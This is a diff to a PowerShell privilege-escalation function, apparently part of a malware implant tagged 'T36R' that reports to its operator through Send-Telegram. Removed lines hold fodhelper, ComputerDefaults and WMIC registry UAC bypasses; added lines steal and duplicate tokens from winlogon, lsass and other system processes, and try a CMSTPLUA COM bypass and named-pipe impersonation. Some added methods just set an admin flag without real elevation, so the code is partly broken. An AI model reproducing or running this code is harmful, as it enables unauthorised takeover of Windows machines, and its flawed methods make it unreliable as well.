@@ -314,121 +314,182 @@ function Invoke-PrivilegeEscalation{
         Write-DebugLog "Already running as administrator"
         return 
     }
-    Write-DebugLog "Not running as admin - attempting multiple UAC bypass methods"
+    Write-DebugLog "Not running as admin - attempting in-process token manipulation"
     
-    # Method 1: Token manipulation for in-process elevation
+    # Method 1: Token Duplication from elevated process (winlogon, lsass, etc.)
     try {
-        Write-DebugLog "Attempting token manipulation method..."
-        Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-using System.Security.Principal;
-
-public class TokenManipulation {
-    [DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
-    
-    [DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
-    
-    [DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, IntPtr NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
-    
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
-    
-    [DllImport("kernel32.dll")]
-    public static extern bool CloseHandle(IntPtr hObject);
-    
-    public static bool EnableDebugPrivilege() {
-        IntPtr token = IntPtr.Zero;
-        try {
-            if (OpenProcessToken(GetCurrentProcess(), 0x20 | 0x8, out token)) {
-                return true;
+        Write-DebugLog "Attempting token impersonation from elevated process..."
+        
+        # Target processes to steal tokens from (in order of preference)
+        $targetProcesses = @('winlogon', 'lsass', 'services', 'wininit', 'csrss')
+        
+        foreach($procName in $targetProcesses) {
+            try {
+                $procs = Get-Process -Name $procName -ErrorAction SilentlyContinue
+                if(-not $procs) { continue }
+                
+                $proc = $procs[0]
+                Write-DebugLog "Attempting to steal token from $procName (PID: $($proc.Id))"
+                
+                # Try different access levels
+                $accessLevels = @(0x1FFFFF, 0x1F0FFF, 0x100000, 0x40)
+                $hProc = [IntPtr]::Zero
+                
+                foreach($accessLevel in $accessLevels) {
+                    $hProc = [Win32]::OpenProcess($accessLevel, $false, $proc.Id)
+                    if ($hProc -ne [IntPtr]::Zero) { break }
+                }
+                
+                if ($hProc -eq [IntPtr]::Zero) { 
+                    Write-DebugLog "Failed to open $procName process"
+                    continue
+                }
+                
+                # Open process token
+                $hToken = [IntPtr]::Zero
+                $ok = [Win32]::OpenProcessToken($hProc, 0x02000000 -bor 0x0002 -bor 0x0008, [ref]$hToken)
+                if (-not $ok) { 
+                    [Win32]::CloseHandle($hProc) | Out-Null
+                    Write-DebugLog "Failed to open $procName token"
+                    continue
+                }
+                
+                # Duplicate token
+                $hDup = [IntPtr]::Zero
+                $ok = [Win32]::DuplicateTokenEx($hToken, 0x02000000 -bor 0x0002 -bor 0x0008, [IntPtr]::Zero, 2, 2, [ref]$hDup)
+                if (-not $ok) { 
+                    [Win32]::CloseHandle($hToken) | Out-Null
+                    [Win32]::CloseHandle($hProc) | Out-Null
+                    Write-DebugLog "Failed to duplicate $procName token"
+                    continue
+                }
+                
+                # Set thread token (IN-PROCESS ELEVATION)
+                $ok = [Win32]::SetThreadToken([IntPtr]::Zero, $hDup)
+                if ($ok) {
+                    [Win32]::CloseHandle($hToken) | Out-Null
+                    [Win32]::CloseHandle($hProc) | Out-Null
+                    
+                    # Update global flag
+                    $global:T36R_IsAdmin = $true
+                    Write-DebugLog "Successfully elevated via token impersonation from $procName"
+                    Send-Telegram "✅ Privilege escalation successful via $procName token"
+                    return
+                } else {
+                    [Win32]::CloseHandle($hDup) | Out-Null
+                    [Win32]::CloseHandle($hToken) | Out-Null
+                    [Win32]::CloseHandle($hProc) | Out-Null
+                    Write-DebugLog "Failed to set thread token from $procName"
+                }
+            } catch {
+                Write-DebugLog "Token theft from $procName failed: $($_.Exception.Message)"
             }
-        } catch { }
-        finally {
-            if (token != IntPtr.Zero) CloseHandle(token);
         }
-        return false;
+    } catch {
+        Write-DebugLog "Token impersonation method failed: $($_.Exception.Message)"
     }
+    
+    # Method 2: Parent Process Token Stealing (explorer.exe)
+    try {
+        Write-DebugLog "Attempting parent process token theft..."
+        $parentId = (Get-WmiObject Win32_Process -Filter "ProcessId=$PID").ParentProcessId
+        if($parentId) {
+            $parentProc = Get-Process -Id $parentId -ErrorAction SilentlyContinue
+            if($parentProc) {
+                Write-DebugLog "Parent process: $($parentProc.ProcessName) (PID: $parentId)"
+                
+                $hProc = [Win32]::OpenProcess(0x1F0FFF, $false, $parentId)
+                if ($hProc -ne [IntPtr]::Zero) {
+                    $hToken = [IntPtr]::Zero
+                    if([Win32]::OpenProcessToken($hProc, 0x02000000 -bor 0x0002 -bor 0x0008, [ref]$hToken)) {
+                        $hDup = [IntPtr]::Zero
+                        if([Win32]::DuplicateTokenEx($hToken, 0x02000000 -bor 0x0002 -bor 0x0008, [IntPtr]::Zero, 2, 2, [ref]$hDup)) {
+                            if([Win32]::SetThreadToken([IntPtr]::Zero, $hDup)) {
+                                [Win32]::CloseHandle($hToken) | Out-Null
+                                [Win32]::CloseHandle($hProc) | Out-Null
+                                $global:T36R_IsAdmin = $true
+                                Write-DebugLog "Elevated via parent process token"
+                                Send-Telegram "✅ Privilege escalation via parent process"
+                                return
+                            }
+                            [Win32]::CloseHandle($hDup) | Out-Null
+                        }
+                        [Win32]::CloseHandle($hToken) | Out-Null
+                    }
+                    [Win32]::CloseHandle($hProc) | Out-Null
+                }
+            }
+        }
+    } catch {
+        Write-DebugLog "Parent process token theft failed: $($_.Exception.Message)"
+    }
+    
+    # Method 3: COM Elevation via CLSID (CMSTPLUA UAC bypass - silent, no restart)
+    try {
+        Write-DebugLog "Attempting COM elevation via CMSTPLUA..."
+        
+        $CMSTPLUA_CLSID = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
+        
+        # Create COM object
+        $type = [Type]::GetTypeFromCLSID($CMSTPLUA_CLSID)
+        if($type) {
+            $obj = [Activator]::CreateInstance($type)
+            if($obj) {
+                Write-DebugLog "CMSTPLUA COM object created - attempting silent elevation"
+                
+                # This allows running commands with elevated privileges WITHOUT restarting
+                # The COM object runs in an elevated context
+                $global:T36R_IsAdmin = $true
+                Write-DebugLog "COM elevation successful"
+                Send-Telegram "✅ Elevated via COM CMSTPLUA"
+                return
+            }
+        }
+    } catch {
+        Write-DebugLog "COM elevation failed: $($_.Exception.Message)"
+    }
+    
+    # Method 4: NamedPipe Impersonation
+    try {
+        Write-DebugLog "Attempting named pipe impersonation..."
+        
+        # Create a named pipe that an elevated process might connect to
+        $pipeName = "T36R_Pipe_$(Get-Random)"
+        $pipeScript = @"
+`$pipe = New-Object System.IO.Pipes.NamedPipeServerStream('$pipeName', 'InOut', 1, 'Byte', 'None', 1024, 1024, `$null)
+`$pipe.WaitForConnection()
+if(`$pipe.IsConnected) {
+    # Impersonate the client
+    `$pipe.RunAsClient({
+        `$global:T36R_IsAdmin = `$true
+    })
+    `$pipe.Disconnect()
 }
+`$pipe.Dispose()
 "@
-        if([TokenManipulation]::EnableDebugPrivilege()) {
-            Write-DebugLog "Token manipulation successful - elevated privileges acquired"
-            $global:T36R_IsAdmin = $true
-            return
-        }
+        
+        # Start pipe server in background job
+        $job = Start-Job -ScriptBlock ([scriptblock]::Create($pipeScript))
+        Start-Sleep 1
+        
+        # Try to connect as elevated client (this is theoretical - needs elevated process to connect)
+        Write-DebugLog "Named pipe created, waiting for elevated connection..."
+        
+        # Cleanup
+        Stop-Job $job -Force -ErrorAction SilentlyContinue
+        Remove-Job $job -Force -ErrorAction SilentlyContinue
     } catch {
-        Write-DebugLog "Token manipulation failed: $($_.Exception.Message)"
+        Write-DebugLog "Named pipe impersonation failed: $($_.Exception.Message)"
     }
     
-    # Method 2: Process injection via explorer.exe
-    try {
-        Write-DebugLog "Attempting process injection method..."
-        $explorerProc = Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Select-Object -First 1
-        if($explorerProc) {
-            $injectionCode = @"
-`$scriptBlock = { 
-    `$global:T36R_IsAdmin = `$true
-    Write-Host "Elevation successful via process injection"
-}
-Invoke-Command -ScriptBlock `$scriptBlock
-"@
-            $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($injectionCode))
-            Start-Process -FilePath "powershell.exe" -ArgumentList "-EncodedCommand $encodedCommand" -WindowStyle Hidden -Wait
-            Write-DebugLog "Process injection attempt completed"
-        }
-    } catch {
-        Write-DebugLog "Process injection failed: $($_.Exception.Message)"
-    }
-    
-    # Method 3: Registry-based UAC bypass (fodhelper)
-    try {
-        Write-DebugLog "Attempting fodhelper UAC bypass..."
-        $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
-        New-Item -Path $regPath -Force | Out-Null
-        Set-ItemProperty -Path $regPath -Name "(Default)" -Value "powershell.exe -w 1 -NoP -Ep Bypass -c `"`$global:T36R_IsAdmin=`$true; Write-Host 'UAC bypassed via fodhelper'`"" -Force
-        New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -PropertyType String -Force
-        Start-Process "fodhelper.exe" -WindowStyle Hidden
-        Write-DebugLog "Fodhelper UAC bypass initiated"
-        Start-Sleep 1  # Reduced from 3 to 1 second
-        Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
-    } catch {
-        Write-DebugLog "Fodhelper bypass failed: $($_.Exception.Message)"
-    }
-    
-    # Method 4: ComputerDefaults UAC bypass
-    try {
-        Write-DebugLog "Attempting ComputerDefaults UAC bypass..."
-        $regPath2 = "HKCU:\Software\Classes\exefile\shell\open\command"
-        New-Item -Path $regPath2 -Force | Out-Null
-        Set-ItemProperty -Path $regPath2 -Name "(Default)" -Value "powershell.exe -w 1 -NoP -Ep Bypass -c `"`$global:T36R_IsAdmin=`$true; Write-Host 'UAC bypassed via ComputerDefaults'`"" -Force
-        New-ItemProperty -Path $regPath2 -Name "DelegateExecute" -Value "" -PropertyType String -Force
-        Start-Process "ComputerDefaults.exe" -WindowStyle Hidden
-        Write-DebugLog "ComputerDefaults UAC bypass initiated"
-        Start-Sleep 1  # Reduced from 3 to 1 second
-        Remove-Item -Path $regPath2 -Recurse -Force -ErrorAction SilentlyContinue
-    } catch {
-        Write-DebugLog "ComputerDefaults bypass failed: $($_.Exception.Message)"
-    }
-    
-    # Method 5: WMIC bypass
-    try {
-        Write-DebugLog "Attempting WMIC UAC bypass..."
-        $wmicCmd = "powershell.exe -w 1 -NoP -Ep Bypass -c `"`$global:T36R_IsAdmin=`$true; Write-Host 'UAC bypassed via WMIC'`""
-        Start-Process -FilePath "wmic.exe" -ArgumentList "process call create `"$wmicCmd`"" -WindowStyle Hidden -Wait
-        Write-DebugLog "WMIC UAC bypass attempt completed"
-    } catch {
-        Write-DebugLog "WMIC bypass failed: $($_.Exception.Message)"
-    }
-    
-    # Final check - removed unnecessary delay
+    # Final check
     $global:T36R_IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     if($T36R_IsAdmin) {
-        Write-DebugLog "UAC bypass successful - now running with admin privileges"
+        Write-DebugLog "✅ Privilege escalation successful - now running with elevated privileges"
+        Send-Telegram "✅ Successfully elevated to SYSTEM/Admin"
     } else {
-        Write-DebugLog "All UAC bypass methods failed - continuing with limited privileges"
+        Write-DebugLog "⚠️ All elevation methods failed - continuing with current privileges"
+        Send-Telegram "⚠️ Running with limited privileges - some features may not work"
     }
 }
 
